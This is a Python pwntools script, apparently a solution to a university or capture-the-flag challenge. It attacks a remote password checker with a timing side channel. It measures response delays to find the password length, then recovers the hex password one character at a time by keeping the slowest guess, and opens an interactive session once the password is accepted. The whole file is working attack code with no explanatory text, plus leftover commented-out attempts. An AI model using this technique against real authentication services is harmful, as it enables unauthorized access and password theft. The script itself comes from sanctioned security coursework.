#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3
import sys, random, string, time
from pwn import *

r = remote("twinpeaks.cs.ucdavis.edu",30003)
allowed_letters = '0123456789ABCDEF'
pw_length = None
pw = None

def send_pwd(pwd):
    r.recvline()
    r.sendline(pwd)
    start = time.time()
    line = r.recvline().decode()
    end = time.time()

    if "Password incorrect" not in line:
        print("booyea!")
        r.interactive()
        exit(0)
    return end-start

timing = []
for i in range(1,50):
    t = send_pwd("a"*i)
    timing.append((i,t))

timing.sort(key=lambda x: x[1], reverse=True)

print("PWD Size: ", timing[0])
for i in range(1,50):
    pw = ''.join(random.choice(allowed_letters) for j in range(i))
    bad = False
    for j in range(5):
        #print("pw: %s" % pw)
        r.sendline(pw)
        start_time = time.time()
        r.recvline_contains(b"Password incorrect!")
        end_time = time.time()
        time_diff = end_time - start_time
        #print("time_diff: %s" % time_diff)
        if time_diff < 0.2:
            bad = True
            break

    if not bad:
        pw_length = i
        print("\nLength: %s\n" % pw_length)
        break

if not pw_length:
    #r.close()
    sys.exit("Failed to get password length")

pw_got = ''
random_pw = ''
s = ''
for i in range(pw_length):
    timings = []
    for letter in allowed_letters:
        #random_pw = ''.join(allowed_letters[0] for j in range(pw_length-i))
         #pw = pw_got + letter + random_pw
        print("pw: %s" % pw, len(pw))
        pw = s+letter
        pw = pw.ljust(pw_length, 'a')
        bad = False

        time_increased = send_pwd(pw)
        timings.append((letter, time_increased))
        #r.sendline(pw)
        #start_time = time.time()
        #print(r.recvline_contains(b"Password incorrect!"))
        #end_time = time.time()
        #time_diff = end_time - start_time 
        #print("time_diff: %s" % time_diff)
        #time_increased = time_diff - 0.2*i
        #print("time_increased: %s" % time_increased) 
        #if time_increased < 0.2 :
        #    bad = True
        #    break
        #print(r.recvline())
    timings.sort(key=lambda x : x[1], reverse=True)
    s += timings[0][0]
        #if not bad:
        #    pw_got += letter
        #    print("\npw_got: %s  pw_got_time: %s\n" % (pw_got, 0.2*len(pw_got)+0.2))
        #    break
